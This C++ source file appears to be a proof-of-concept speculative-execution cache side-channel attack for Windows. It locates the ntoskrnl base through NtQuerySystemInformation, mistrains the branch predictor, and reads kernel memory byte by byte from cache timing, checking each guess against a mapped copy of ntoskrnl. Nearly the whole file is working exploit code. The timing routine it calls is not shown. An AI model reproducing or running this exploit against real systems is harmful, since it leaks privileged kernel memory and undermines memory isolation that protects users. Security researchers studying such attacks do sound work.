// CacheAttack.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <Windows.h>

EXTERN_C_START

void _run_attempt();
DWORD64 pointers[4096 / 2];
DWORD64* speculative;

BYTE*    L2_cache_clear;

DWORD64 times[256];

EXTERN_C_END

typedef NTSTATUS (WINAPI *pNtQuerySystemInformation)(
	_In_      DWORD SystemInformationClass,
	_Inout_   PVOID                    SystemInformation,
	_In_      ULONG                    SystemInformationLength,
	_Out_opt_ PULONG                   ReturnLength
);

typedef NTSTATUS(WINAPI *pNtYieldProcessor)(
	);


pNtQuerySystemInformation NtQuerySystemInformation;
pNtYieldProcessor NtYieldProcessor;
#define SystemModuleInformation 11

#pragma pack(push, 8)
typedef struct _RTL_PROCESS_MODULE_INFORMATION
{
	HANDLE Section;
	PVOID MappedBase;
	PVOID ImageBase;
	ULONG ImageSize;
	ULONG Flags;
	USHORT LoadOrderIndex;
	USHORT InitOrderIndex;
	USHORT LoadCount;
	USHORT OffsetToFileName;
	UCHAR FullPathName[256];
} RTL_PROCESS_MODULE_INFORMATION, *PRTL_PROCESS_MODULE_INFORMATION;

typedef struct
{
	ULONG ModulesCount;
	RTL_PROCESS_MODULE_INFORMATION Modules[100];
} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;


#pragma pack(pop)

BYTE* cacheClear;

size_t run_attempt_single(BYTE* ptr)
{
	//
	// Set up the loop. The point is to have a big loop that the branch predictor "learns" to take
	// followed by a bad speculation on iteration 1000.
	//
	for (size_t i = 0; i < ARRAYSIZE(pointers); i++)
	{
		pointers[i] = (DWORD64)&pointers[0];
		speculative[i] = (DWORD64)FALSE;
	}
	pointers[1000] = (DWORD64)ptr;
	speculative[1000] = (DWORD64)TRUE;

	DWORD64 times_min[256] = { 0 };
	
	memset(times_min, 0xff, sizeof(times_min));

	// warm up
	for (size_t attempt = 0; attempt < 2; attempt++)
		_run_attempt();

	for (size_t attempt = 0; attempt < 5; attempt++)
	{
		_run_attempt();
		for (size_t i = 0; i < 256; i++)
			times_min[i] = min(times_min[i], times[i]);
	}

	size_t max_idx = 0;
	for (size_t i = 0; i < 256; i++)
	{
		if (times_min[i] > times_min[max_idx])
			max_idx = i;
	}

	return max_idx;
}

BYTE* value;

int main()
{
	int cpuinfo[4];
	__cpuidex(cpuinfo, 0, 0);
	char* cpuName = (char*)&cpuinfo[1];

	value = (BYTE*)VirtualAlloc(0, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	*value = 0x1c;

	speculative = (DWORD64*)(VirtualAlloc(0, 0x10000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE | PAGE_NOCACHE));

	L2_cache_clear = (BYTE*)VirtualAlloc(0, 256 * 4096, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE | PAGE_WRITECOMBINE);

	(*(FARPROC*)&NtQuerySystemInformation) = GetProcAddress(LoadLibrary(L"ntdll.dll"), "NtQuerySystemInformation");

	SYSTEM_MODULE_INFORMATION modInfo = { 0 };
	DWORD dw;

	NTSTATUS status = NtQuerySystemInformation(SystemModuleInformation, &modInfo, sizeof(modInfo), &dw);

	void* ntoskrnlBase = (void*)modInfo.Modules[0].ImageBase;
	size_t ntoskrnlSize = modInfo.Modules[0].ImageSize;

	cacheClear = (BYTE*)VirtualAlloc((void*)0x1000000, 0x10000, MEM_COMMIT | MEM_RESERVE | MEM_LARGE_PAGES, PAGE_READWRITE);

	BYTE* hMod = (BYTE*)(LoadLibraryExW(L"ntoskrnl.exe", NULL, LOAD_LIBRARY_AS_IMAGE_RESOURCE)) - 2;
	IMAGE_DOS_HEADER* imgDos = (IMAGE_DOS_HEADER*)(hMod);
	IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)(hMod + imgDos->e_lfanew);

	size_t i = 0x1000;
	while(TRUE)
	{
		BYTE* addr = (BYTE*)ntoskrnlBase;
		size_t guess = run_attempt_single(&addr[i]);
		printf("0x%02x: guess: 0x%02x, real:0x%02x\n", i, guess, hMod[i]);
		i++;
	}

    return 0;
}
